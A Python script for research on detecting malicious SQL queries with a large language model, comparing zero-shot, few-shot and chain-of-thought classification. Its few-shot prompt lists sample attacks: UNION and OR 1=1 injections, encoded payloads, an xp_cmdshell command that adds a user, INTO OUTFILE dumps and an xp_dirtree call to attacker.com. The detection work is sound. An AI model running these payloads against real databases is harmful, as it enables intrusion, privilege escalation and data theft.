"""
LLM-детектор вредоносного SQL на базе Groq (llama-3.3-70b-versatile).

Режимы:
    zero_shot  — классификация без примеров
    few_shot   — 2 примера на класс в промпте
    cot        — Chain-of-Thought: модель рассуждает перед ответом

Запуск:
    python src/detector_llm.py --mode zero_shot --n 300
    python src/detector_llm.py --mode few_shot  --n 300
    python src/detector_llm.py --mode cot       --n 300
    python src/detector_llm.py --mode all       --n 300
"""

import argparse
import json
import os
import re
import time
from pathlib import Path

import pandas as pd
import numpy as np
from dotenv import load_dotenv
from groq import Groq, RateLimitError
from sklearn.model_selection import train_test_split

from evaluate import metrics_report, save_results

load_dotenv()

DATA_PROCESSED = Path(__file__).parent.parent / "data" / "processed"
RESULTS_DIR = Path(__file__).parent.parent / "results"
RESULTS_DIR.mkdir(exist_ok=True)

client = Groq(api_key=os.environ["GROQ_API_KEY"])
MODEL = "llama-3.3-70b-versatile"

LABEL_MAP = {
    "legit": 0, "legitimate": 0, "safe": 0, "normal": 0,
    "sqli": 1, "sql injection": 1, "injection": 1, "sql_injection": 1,
    "obfuscated": 2, "obfuscation": 2, "encoded": 2,
    "privilege": 3, "privilege escalation": 3, "escalation": 3, "privesc": 3,
    "exfiltration": 4, "data exfiltration": 4, "exfil": 4,
}

LABEL_NAMES = {0: "legit", 1: "sqli", 2: "obfuscated", 3: "privilege", 4: "exfiltration"}

# ── Промпты ────────────────────────────────────────────────────────────────

SYSTEM_PROMPT = """You are a cybersecurity expert specializing in SQL threat detection.
Classify SQL queries into exactly one of these 5 categories:

- legit: normal SQL with no malicious intent (SELECT/INSERT/UPDATE for business logic)
- sqli: SQL injection (UNION SELECT, OR 1=1, SLEEP(), WAITFOR, boolean/time-based blind)
- obfuscated: attack using encoding to evade filters (hex 0x..., CHAR(), /**/ comments, %xx URL encoding, string concatenation to hide keywords)
- privilege: privilege escalation (GRANT, REVOKE, xp_cmdshell, sp_addsrvrolemember, CREATE USER, ALTER USER, access to sys/mysql.user/pg_shadow)
- exfiltration: data theft (INTO OUTFILE, INTO DUMPFILE, LOAD_FILE, UTL_HTTP, DNS callbacks, SELECT without WHERE on sensitive tables)

Key distinction: obfuscated queries LOOK like encoded/scrambled text even if the underlying attack is sqli."""

FEW_SHOT_EXAMPLES = """
Examples:

SQL: SELECT * FROM orders WHERE user_id = ? ORDER BY created_at DESC
Label: legit

SQL: INSERT INTO logs (event, ts) VALUES ('login', NOW())
Label: legit

SQL: ' OR '1'='1
Label: sqli

SQL: 1 UNION SELECT username, password FROM users--
Label: sqli

SQL: 1; WAITFOR DELAY '0:0:5'--
Label: sqli

SQL: 0x53454c454354202a2046524f4d207573657273
Label: obfuscated

SQL: CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
Label: obfuscated

SQL: SELECT/**/*/**/FROM/**/users
Label: obfuscated

SQL: %27%20OR%20%271%27%3D%271
Label: obfuscated

SQL: GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
Label: privilege

SQL: EXEC xp_cmdshell 'net user hacker P@ss123 /add'
Label: privilege

SQL: SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt'
Label: exfiltration

SQL: EXEC master..xp_dirtree '//attacker.com/share'
Label: exfiltration

SQL: GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%';
Label: privilege

SQL: EXEC xp_cmdshell 'net user hacker P@ss /add'
Label: privilege

SQL: SELECT * FROM users INTO OUTFILE '/var/www/dump.txt'
Label: exfiltration

SQL: SELECT table_name FROM information_schema.tables UNION SELECT password FROM mysql.user
Label: exfiltration
"""

ZERO_SHOT_BATCH = """Classify each SQL query below. Reply with ONLY a JSON array of label strings in the same order.
Labels: legit, sqli, obfuscated, privilege, exfiltration

{queries}

Reply with ONLY a JSON array, e.g.: ["legit", "sqli", "obfuscated"]"""

FEW_SHOT_BATCH = FEW_SHOT_EXAMPLES + """
Now classify each query below. Reply with ONLY a JSON array of label strings.

{queries}

Reply with ONLY a JSON array."""

COT_BATCH = FEW_SHOT_EXAMPLES + """
Now classify each query below. For each, write one short reason then the label.
Format strictly:
1. <reason> | Label: <label>
2. <reason> | Label: <label>
...

{queries}"""


BATCH_SIZE = 10  # запросов за один вызов API


# ── Парсинг ответа ─────────────────────────────────────────────────────────

def _find_label(text: str) -> int:
    t = text.strip().lower()
    for key, val in LABEL_MAP.items():
        if key in t:
            return val
    return -1


def parse_batch_response(text: str, mode: str, n: int) -> list[int]:
    text = text.strip()

    if mode in ("zero_shot", "few_shot"):
        # ожидаем JSON-массив
        m = re.search(r'\[.*?\]', text, re.DOTALL)
        if m:
            try:
                items = json.loads(m.group())
                return [_find_label(str(x)) for x in items][:n]
            except Exception:
                pass
        # фолбэк: каждая строка = один ответ
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        return [_find_label(l) for l in lines[:n]]

    else:  # cot: "1. reason | Label: xxx"
        results = []
        for line in text.splitlines():
            m = re.search(r'label\s*:\s*(\w[\w\s]*)', line, re.IGNORECASE)
            if m:
                results.append(_find_label(m.group(1)))
        return results[:n]


# ── Запрос к API (батч) ────────────────────────────────────────────────────

def classify_batch(queries: list[str], mode: str, retries: int = 3) -> tuple[list[int], float]:
    numbered = "\n".join(f"{i+1}. {q}" for i, q in enumerate(queries))

    if mode == "zero_shot":
        user_content = ZERO_SHOT_BATCH.format(queries=numbered)
        max_tokens = 60
    elif mode == "few_shot":
        user_content = FEW_SHOT_BATCH.format(queries=numbered)
        max_tokens = 60
    else:  # cot
        user_content = COT_BATCH.format(queries=numbered)
        max_tokens = len(queries) * 20  # короткое рассуждение, ~20 токенов на пример

    for attempt in range(retries):
        try:
            t0 = time.perf_counter()
            response = client.chat.completions.create(
                model=MODEL,
                messages=[
                    {"role": "system", "content": SYSTEM_PROMPT},
                    {"role": "user", "content": user_content},
                ],
                max_tokens=max_tokens,
                temperature=0.0,
            )
            elapsed = time.perf_counter() - t0
            labels = parse_batch_response(response.choices[0].message.content, mode, len(queries))
            # дополняем если парсер вернул меньше
            while len(labels) < len(queries):
                labels.append(-1)
            return labels, elapsed

        except RateLimitError:
            wait = 60
            print(f"    [rate limit] sleeping {wait}s...", flush=True)
            time.sleep(wait)

    return [-1] * len(queries), 0.0


# ── Основной цикл ──────────────────────────────────────────────────────────

def run_llm_detector(df_test: pd.DataFrame, mode: str) -> dict:
    print(f"\n[*] LLM detector | mode={mode} | n={len(df_test)} | batch={BATCH_SIZE}", flush=True)

    queries = df_test["query"].tolist()
    labels  = df_test["label"].tolist()

    y_true, y_pred, times = [], [], []
    failed = 0

    for i in range(0, len(queries), BATCH_SIZE):
        batch_q = queries[i:i+BATCH_SIZE]
        batch_l = labels[i:i+BATCH_SIZE]

        preds, elapsed = classify_batch(batch_q, mode)

        for true, pred in zip(batch_l, preds):
            y_true.append(int(true))
            y_pred.append(pred if pred != -1 else 0)
            if pred == -1:
                failed += 1
        times.append(elapsed)

        done = min(i + BATCH_SIZE, len(queries))
        print(f"    batch {i//BATCH_SIZE+1}: [{done}/{len(queries)}] failed={failed} ({elapsed*1000:.0f}ms)", flush=True)
        time.sleep(8)  # ~10 запросов = батч, 8с пауза между батчами

    total_time = sum(times)
    print(f"    done. failed_parses={failed}/{len(df_test)}", flush=True)

    return metrics_report(
        np.array(y_true),
        np.array(y_pred),
        f"LLM ({mode})",
        total_time,
        len(df_test),
    )


# ── Main ───────────────────────────────────────────────────────────────────

def main(modes: list[str], n_test: int = 500,
         dataset_file: str = "dataset.csv", results_suffix: str = "") -> None:
    df = pd.read_csv(DATA_PROCESSED / dataset_file, encoding="utf-8")
    df = df.dropna(subset=["query", "label"])
    df["query"] = df["query"].astype(str)

    _, df_test_full = train_test_split(df, test_size=0.2, random_state=42, stratify=df["label"])

    n_per_class = n_test // df["label"].nunique()
    df_sample = pd.concat([
        grp.sample(min(len(grp), n_per_class), random_state=42)
        for _, grp in df_test_full.groupby("label")
    ]).reset_index(drop=True)
    print(f"LLM test sample: {len(df_sample)} examples ({n_per_class} per class)")
    print(df_sample["label_name"].value_counts().to_string())

    results = []
    for mode in modes:
        result = run_llm_detector(df_sample, mode)
        results.append(result)

    out = RESULTS_DIR / f"llm_results{results_suffix}.csv"
    save_results(results, out)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", default="all",
                        choices=["zero_shot", "few_shot", "cot", "all"])
    parser.add_argument("--n", type=int, default=500,
                        help="Размер тестовой выборки для LLM")
    parser.add_argument("--dataset", default="dataset.csv")
    parser.add_argument("--suffix", default="", help="Суффикс для файлов результатов")
    args = parser.parse_args()

    modes = ["zero_shot", "few_shot", "cot"] if args.mode == "all" else [args.mode]
    main(modes=modes, n_test=args.n, dataset_file=args.dataset, results_suffix=args.suffix)
